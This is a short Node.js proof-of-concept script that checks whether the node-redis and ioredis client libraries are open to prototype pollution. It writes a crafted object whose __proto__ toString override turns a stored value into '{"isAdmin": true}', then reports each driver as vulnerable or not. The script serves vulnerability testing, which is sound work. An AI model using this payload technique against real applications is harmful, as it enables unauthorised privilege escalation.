var assert = require('assert');
var nodeRedis = require('redis');
var ioRedis = require('ioredis');


const PORT = 6379;
const HOST = '127.0.0.1';
const KEY = 'KEY';
const PAYLOAD = {
    isAdmin: false,
    __proto__: {
        toString: function () {
            return '{"isAdmin": true}'
        }
    }
};
const INJECTED_PAYLOAD = {
    isAdmin: true
};
var nodeRedisClient = nodeRedis.createClient(PORT, HOST);
var ioRedisClient = new ioRedis(PORT, HOST);

function test_prototype_pollution(client, driver) {
    client.set(KEY, PAYLOAD);
    client.get(KEY, function (err, reply) {
        if (!err) {
            try {
                assert.deepEqual(JSON.parse(reply), INJECTED_PAYLOAD);
                console.log(driver + " is vulnerable to prototype pollution attack.");
            } catch (error) {
                console.log(driver + " is NOT vulnerable to prototype pollution attack.");
            }
        } else {
            console.log("There was an error: ", err);
        }
    });
}

test_prototype_pollution(nodeRedisClient, "node-redis");
nodeRedisClient.quit();

test_prototype_pollution(ioRedisClient, "ioredis");
ioRedisClient.quit();